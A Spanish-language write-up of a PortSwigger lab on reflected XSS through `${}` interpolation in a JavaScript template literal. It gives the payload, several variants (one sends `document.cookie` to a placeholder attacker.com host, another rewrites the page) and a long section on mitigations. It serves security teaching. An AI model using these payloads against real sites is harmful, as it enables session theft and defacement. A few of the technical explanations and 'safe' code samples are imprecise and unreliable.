
---

# Reflected XSS en template literal con Unicode-escaping múltiple

En este documento explicamos cómo explotar una vulnerabilidad de Cross-Site Scripting reflejado cuando la entrada del usuario se inserta dentro de un **template literal de JavaScript** (delimitado por backticks `` ` ``) y el servidor aplica Unicode-escaping a múltiples caracteres especiales: ángulos (`<`, `>`), comillas simples (`'`), comillas dobles (`"`), backslash (`\`) y backticks (`` ` ``).

[Ver laboratorio PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

---

## Contexto del laboratorio

- **Objetivo**: encontrar y explotar una vulnerabilidad de XSS reflejado en la funcionalidad de búsqueda del blog.
    
- **Requisito para resolver el laboratorio**: realizar un ataque XSS que ejecute `alert()` dentro del template string.
    
- **Peculiaridad observada**: el servidor refleja la entrada del usuario dentro de un template literal de JavaScript y aplica las siguientes protecciones:
    
    1. **Unicode-escaping de ángulos**: `<` → `\u003c`, `>` → `\u003e`
    2. **Unicode-escaping de comillas**: `'` → `\u0027`, `"` → `\u0022`
    3. **Unicode-escaping de backslash**: `\` → `\u005c`
    4. **Unicode-escaping de backticks**: `` ` `` → `\u0060`

Estas defensas intentan prevenir la inyección de nuevas etiquetas HTML y el cierre prematuro del template literal, pero **no protegen contra la interpolación de expresiones** mediante `${}`.

---

## Template literals en JavaScript (ES6+)

Los **template literals** (o template strings) son cadenas delimitadas por backticks (`` ` ``) introducidas en ECMAScript 2015 (ES6). Permiten:

- **Cadenas multi-línea** sin necesidad de concatenación.
- **Interpolación de expresiones** con la sintaxis `${expresión}`.

### Ejemplo básico

```javascript
const nombre = 'Juan';
const mensaje = `Hola, ${nombre}!`;
console.log(mensaje); // "Hola, Juan!"
```

### Interpolación de expresiones

Dentro de `${}` se puede colocar **cualquier expresión JavaScript válida**, incluyendo:

- Variables: `${variable}`
- Operaciones aritméticas: `${5 + 3}`
- Llamadas a funciones: `${alert(1)}`
- Expresiones complejas: `${obj.metodo()}`

El resultado de la expresión se convierte a string y se inserta en la posición correspondiente del template literal.

---

## Código vulnerable observado

Cuando realizamos una búsqueda en el laboratorio con el término `testing`, el código JavaScript generado es:

```javascript
var message = `0 search results for 'testing'`;
document.getElementById('searchMessage').innerText = message;
```

El servidor inserta el término de búsqueda directamente dentro del template literal, rodeándolo de comillas simples en el texto del mensaje.

### Flujo de procesamiento

1. El usuario envía una búsqueda (parámetro `search=testing`).
2. El servidor refleja el valor dentro del template literal:
   ```javascript
   var message = `0 search results for 'testing'`;
   ```
3. El navegador interpreta el template literal y asigna el resultado a `message`.
4. El contenido se muestra en el elemento `searchMessage`.

---

## Por qué las protecciones son insuficientes

Aunque el servidor escapa caracteres peligrosos con Unicode-escape (`\uXXXX`), **no previene el uso de interpolación de expresiones** con `${}`.

### Limitaciones del Unicode-escaping en template literals

- **Backticks escapados**: `\u0060` impide cerrar prematuramente el template literal con `` ` ``.
- **Comillas/ángulos escapados**: impiden construir etiquetas HTML o romper cadenas anidadas dentro del template.
- **Pero `${}` NO se escapa**: el servidor no detecta ni neutraliza la sintaxis de interpolación.

### Cómo funciona `${}`

El navegador procesa `${}` **antes** de evaluar los escapes Unicode, porque la interpolación es parte de la sintaxis del template literal, no un carácter escapable.

**Flujo de evaluación**:

1. El navegador detecta el template literal delimitado por backticks.
2. Identifica todas las expresiones `${...}` dentro del literal.
3. Evalúa cada expresión y sustituye `${...}` por el resultado.
4. Procesa los escapes Unicode en las partes literales de la cadena.

Por tanto, si inyectamos `${alert(0)}`, el navegador lo interpretará como una interpolación válida y ejecutará `alert(0)` **antes** de procesar cualquier escape.

---

## Payload que resuelve el laboratorio

```
${alert(0)}
```

### Desglose del payload

- `${...}`: sintaxis de interpolación de expresiones en template literals.
- `alert(0)`: llamada a la función `alert` con argumento `0`.

No requiere cerrar el template literal ni escapar caracteres, porque `${}` es procesado por el motor de JavaScript como parte de la sintaxis del template, no como contenido de la cadena.

### Código JavaScript generado (reflejo del payload)

Cuando enviamos `search=${alert(0)}`, el servidor genera:

```javascript
var message = `0 search results for '${alert(0)}'`;
document.getElementById('searchMessage').innerText = message;
```

### Ejecución paso a paso

1. El navegador parsea el template literal `\`0 search results for '${alert(0)}'\``.
2. Detecta la interpolación `${alert(0)}`.
3. **Evalúa la expresión**: ejecuta `alert(0)`, mostrando la alerta.
4. Sustituye `${alert(0)}` por el resultado de la expresión (en este caso, `undefined` se convierte en string vacío o `"undefined"` dependiendo del contexto, pero la alerta ya se ejecutó).
5. Asigna el resultado final a `message` y lo inserta en el DOM con `innerText`.

El laboratorio se resuelve cuando aparece la alerta.

---

## Pasos para reproducir

1. Acceder a la funcionalidad de búsqueda del laboratorio.
2. En el campo de búsqueda, introducir:
   ```
   ${alert(0)}
   ```
3. Enviar la búsqueda (presionar Enter o clic en el botón de búsqueda).
4. Observar que se ejecuta `alert(0)` inmediatamente al cargar los resultados.
5. Inspeccionar el código fuente de la página para verificar que el payload se insertó dentro del template literal:
   ```javascript
   var message = `0 search results for '${alert(0)}'`;
   ```

---

## Variantes del payload

### Variante 1: Ejecutar múltiples expresiones

```
${alert(0), alert(1)}
```

- Usa el operador coma para ejecutar múltiples expresiones en secuencia.
- Muestra dos alertas: primero `alert(0)`, luego `alert(1)`.

### Variante 2: Exfiltración de datos

```
${fetch('https://attacker.com?c='+document.cookie)}
```

- Envía las cookies de la víctima al servidor del atacante.
- Requiere que el servidor del atacante esté preparado para recibir la petición.

### Variante 3: Modificar el DOM

```
${document.body.innerHTML='<h1>Hackeado</h1>'}
```

- Reemplaza el contenido de la página con HTML arbitrario.
- Demuestra control total sobre el DOM.

### Variante 4: Usar funciones anónimas

```
${(function(){alert(0)})()}
```

- Define y ejecuta inmediatamente una función anónima.
- Útil para estructurar código más complejo.

### Variante 5: Combinar con operadores

```
${alert(document.domain)}
```

- Muestra el dominio actual en la alerta.
- Útil para confirmar el contexto de ejecución.

---

## Riesgos asociados

- **Ejecución arbitraria de JavaScript**: el atacante puede ejecutar cualquier código en el contexto de la página, permitiendo:
  - Robo de cookies y tokens de sesión.
  - Acciones en nombre del usuario (cambio de contraseña, transferencias, publicaciones).
  - Keylogging y captura de formularios.
  - Redirección a sitios de phishing.
  - Desfiguración de la página.
  
- **Bypass de protecciones tradicionales**: Unicode-escaping de caracteres especiales no previene interpolación de expresiones en template literals.

- **Superficie de ataque ampliada**: cualquier campo que se refleje dentro de template literals es potencialmente vulnerable si no se previene la interpolación.

---

## Mitigaciones y soluciones

Para eliminar esta vulnerabilidad, aplicar defensas en profundidad:

### 1. **Evitar insertar datos no confiables en template literals**

La defensa más segura es **no reflejar entrada del usuario dentro de template literals**.

**Solución preferida**:

- Usar **cadenas normales** (delimitadas por `'` o `"`) y concatenación o plantillas del lado del servidor que no permitan interpolación de expresiones.

```javascript
// En lugar de esto (vulnerable):
var message = `0 search results for '${userInput}'`;

// Hacer esto (seguro):
var message = '0 search results for \'' + sanitizedInput + '\'';
```

### 2. **Escapar `$` y `{` para prevenir interpolación**

Si es inevitable usar template literals, escapar los caracteres que inician interpolación:

- `$` → `\$` o `\u0024`
- `{` → `\{` o `\u007b`

**Ejemplo (servidor)**:

```python
def escape_template_literal(s):
    return s.replace('\\', '\\\\') \
            .replace('`', '\\`') \
            .replace('$', '\\$') \
            .replace('{', '\\{')
```

Sin embargo, esto puede ser complejo y propenso a errores.

### 3. **Usar APIs DOM seguras en lugar de asignación directa**

En lugar de construir cadenas con template literals que luego se asignan al DOM, usar propiedades seguras:

```javascript
// Vulnerable:
var message = `0 search results for '${userInput}'`;
document.getElementById('searchMessage').innerText = message;

// Seguro:
var searchTerm = sanitizeInput(userInput);
var message = '0 search results for \'' + searchTerm + '\'';
document.getElementById('searchMessage').textContent = message;
```

Nota: `textContent` trata todo como texto plano y no interpreta HTML ni JavaScript.

### 4. **Validar y sanitizar entrada del usuario**

- Aplicar **whitelist** de caracteres permitidos (letras, números, espacios).
- Rechazar o eliminar caracteres especiales como `$`, `{`, `}`, `\`, `` ` ``.

**Ejemplo (servidor)**:

```python
import re

def sanitize_search_term(term):
    # Permitir solo alfanuméricos, espacios y algunos símbolos seguros
    return re.sub(r'[^a-zA-Z0-9\s\-_]', '', term)
```

### 5. **Implementar Content Security Policy (CSP)**

CSP con `script-src 'self'` y sin `unsafe-eval` puede reducir (pero no eliminar completamente) el impacto de XSS.

```http
Content-Security-Policy: script-src 'self'; object-src 'none';
```

- Bloquea la carga de scripts de orígenes no autorizados.
- **Limitación**: `${alert(0)}` se ejecuta en el contexto del script inline permitido, por lo que CSP no lo bloquea directamente si el script está en el código de la página.

### 6. **Usar frameworks con auto-escape**

Frameworks modernos (React, Angular, Vue) escapan automáticamente datos en la mayoría de contextos, pero **no dentro de template literals de JavaScript**.

- **React**: evitar `dangerouslySetInnerHTML` y no construir scripts dinámicamente.
- **Angular**: usar data binding seguro `{{ }}` en plantillas HTML, no en scripts JS.
- **Vue**: evitar `v-html` con datos no confiables y no reflejar entrada en bloques `<script>`.

### 7. **Preferir JSON para pasar datos a JavaScript**

En lugar de interpolar datos directamente en scripts, pasarlos como JSON desde el servidor y parsearlos en cliente:

**HTML (servidor)**:

```html
<script>
    var searchData = JSON.parse('<?php echo json_encode($searchTerm); ?>');
    var message = '0 search results for \'' + searchData + '\'';
    document.getElementById('searchMessage').textContent = message;
</script>
```

`json_encode` maneja el escaping correctamente para cadenas JSON.

---

## Ejemplo de corrección completa

### Antes (vulnerable)

```html
<script>
    var message = `0 search results for '<?php echo $searchTerm; ?>'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

### Después (seguro — Opción 1: sin template literals)

```html
<script>
    var searchTerm = <?php echo json_encode($searchTerm); ?>;
    var message = '0 search results for \'' + searchTerm + '\'';
    document.getElementById('searchMessage').textContent = message;
</script>
```

- `json_encode` escapa correctamente la cadena para uso en JavaScript.
- No se usan template literals, evitando interpolación de expresiones.
- `textContent` inserta el contenido como texto plano, sin interpretación HTML/JS.

### Después (seguro — Opción 2: con data attributes)

**HTML**:

```html
<div id="searchMessage" data-term="<?php echo htmlspecialchars($searchTerm); ?>"></div>

<script>
    var term = document.getElementById('searchMessage').dataset.term;
    var message = '0 search results for \'' + term + '\'';
    document.getElementById('searchMessage').textContent = message;
</script>
```

- El término de búsqueda se pasa mediante un atributo `data-*`.
- `htmlspecialchars` escapa para contexto HTML.
- JavaScript lee el valor de forma segura con `dataset.term`.

---

## Comparación: Unicode-escape vs Interpolación

| Carácter | Unicode-escape | ¿Previene XSS en template literal? |
|----------|----------------|-------------------------------------|
| `` ` `` | `\u0060` | ✅ Sí (impide cerrar el literal) |
| `'` | `\u0027` | ✅ Sí (en contextos de cadenas anidadas) |
| `"` | `\u0022` | ✅ Sí (en contextos de cadenas anidadas) |
| `<` | `\u003c` | ✅ Sí (impide inyectar etiquetas HTML) |
| `>` | `\u003e` | ✅ Sí (impide cerrar etiquetas HTML) |
| `\` | `\u005c` | ✅ Sí (impide crear nuevos escapes) |
| `${` | Sin escape | ❌ **NO** — permite interpolación |

El Unicode-escaping protege contra cierre prematuro del literal y construcción de HTML, pero **no contra la interpolación de expresiones**, que es parte integral de la sintaxis del template literal.

---

## Recomendaciones finales

1. **No usar template literals para insertar datos no confiables**. Preferir cadenas normales con concatenación segura o JSON.

2. **Si es inevitable usar template literals**, escapar `$` y `{` para prevenir interpolación (aunque esto es propenso a errores).

3. **Validar y sanitizar entrada** con whitelist estricta, rechazando caracteres especiales.

4. **Usar APIs DOM seguras** (`textContent`, `setAttribute`) en lugar de asignaciones que interpreten código.

5. **Implementar CSP** para reducir el impacto de XSS (aunque no elimina completamente este vector).

6. **Preferir JSON** para pasar datos desde servidor a cliente, asegurando escaping correcto.

7. **Educar al equipo** sobre los riesgos específicos de template literals y la diferencia con cadenas tradicionales.

8. **Auditar código** buscando patrones de inserción de entrada de usuario dentro de backticks.

---

## Referencias

- [PortSwigger Web Security Academy - XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [MDN - Template literals (Template strings)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [ECMAScript 2015 Specification - Template Literals](https://262.ecma-international.org/6.0/#sec-template-literals)
- [Template Literal Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#template-literals-injection)

---
